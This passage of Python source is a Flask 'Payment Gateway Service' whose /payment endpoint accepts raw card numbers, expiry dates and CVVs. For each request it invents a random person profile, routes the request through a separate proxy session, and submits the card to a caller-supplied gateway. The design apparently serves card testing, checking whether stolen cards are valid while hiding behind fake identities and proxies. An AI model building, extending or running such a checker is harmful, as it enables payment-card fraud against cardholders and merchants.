                timeout=REQUEST_TIMEOUT,
            )
            session.cookies.update(response.cookies)

        status, message = _parse_payment_response(
            request_id, card_number, response.content, random_person, gateway_config, session
        )

        session_manager.cleanup_session(request_id)
        return status, message

    except requests.RequestException as exc:
        session_manager.cleanup_session(request_id)
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"🔴 [{request_id}] Proxy error: {msg}")
            return ERROR, msg
        logger.error(f"Payment request failed [{request_id}]: {exc}")
        return ERROR, f"Request failed: {exc}"


# ═══════════════════════════════════════════════════════
#  Flask Routes
# ═══════════════════════════════════════════════════════

@app.route("/")
def index():
    return "Payment Gateway Service – V5.0.0"


@app.route("/status")
def system_status():
    """Health-check endpoint."""
    return jsonify({
        "status": "running",
        "version": "5.0.0",
        "active_sessions": session_manager.get_active_sessions_count(),
        "isolation_mode": "per_request",
        "timestamp": datetime.now().isoformat(),
    })


@app.route("/payment", methods=["POST"])
def handle_payment():
    """Process a single card payment request with full session isolation."""
    request_id = session_manager.create_request_id()
    start_time = time.time()

    logger.info(f"🔄 [{request_id}] Payment request received")

    try:
        data = request.get_json(silent=True)
        if not data:
            logger.error(f"❌ [{request_id}] No JSON body")
            return jsonify({"status": ERROR, "result": "No data received", "request_id": request_id}), 400

        gateway_config = data.get("gateway_config")
        if not gateway_config:
            logger.error(f"❌ [{request_id}] Missing gateway_config")
            return jsonify({"status": ERROR, "result": "Gateway configuration is missing", "request_id": request_id}), 400

        card_info = data.get("card")
        if not card_info:
            logger.error(f"❌ [{request_id}] Missing card info")
            return jsonify({"status": ERROR, "result": "Card information is missing", "request_id": request_id}), 400

        for field in ("number", "month", "year", "cvv"):
            if not card_info.get(field):
                logger.error(f"❌ [{request_id}] Missing card field: {field}")
                return jsonify({"status": ERROR, "result": f"{field} is missing in card info", "request_id": request_id}), 400

        card_number = card_info["number"]
        logger.info(f"💳 [{request_id}] Card ****{card_number[-4:]}  |  Sessions: {session_manager.get_active_sessions_count()}")

        # Generate person profile
        random_person = generate_random_person()
        if not random_person:
            return jsonify({"status": ERROR, "result": "Failed to generate random person", "request_id": request_id}), 400

        logger.info(f"👤 [{request_id}] Profile: {random_person['first_name']} {random_person['last_name']}")

        # Create isolated session
        try:
            session = session_manager.get_session(request_id, gateway_config, random_person)
        except ProxyConnectionError as pe:
            elapsed = time.time() - start_time
            logger.error(f"🔴 [{request_id}] Proxy error during session: {pe.message}")
            return jsonify({
                "status": ERROR, "result": pe.message,
                "request_id": request_id, "processing_time": round(elapsed, 2),
            }), 400

        # Process
        status, result = process_payment(request_id, gateway_config, card_info, random_person, session)
        elapsed = time.time() - start_time
        logger.info(f"{'✅' if ERROR not in status else '❌'} [{request_id}] {status} | {result} | {elapsed:.2f}s")

        resp_body = {
            "status": status,
            "result": result,
            "request_id": request_id,
            "processing_time": round(elapsed, 2),
        }
        return jsonify(resp_body), (200 if ERROR not in status else 400)

    except ProxyConnectionError as pe:
        session_manager.cleanup_session(request_id)
        elapsed = time.time() - start_time
        logger.error(f"🔴 [{request_id}] Proxy: {pe.message}")
        return jsonify({
            "status": ERROR, "result": pe.message,
            "request_id": request_id, "processing_time": round(elapsed, 2),
        }), 400

    except Exception as exc:
        session_manager.cleanup_session(request_id)
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"🔴 [{request_id}] Proxy: {msg}")
            return jsonify({"status": ERROR, "result": msg, "request_id": request_id}), 400

        logger.error(f"💥 [{request_id}] Unexpected: {exc}", exc_info=True)
        return jsonify({"status": ERROR, "result": "Internal server error", "request_id": request_id}), 500


# ═══════════════════════════════════════════════════════
#  Entry Point
# ═══════════════════════════════════════════════════════

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
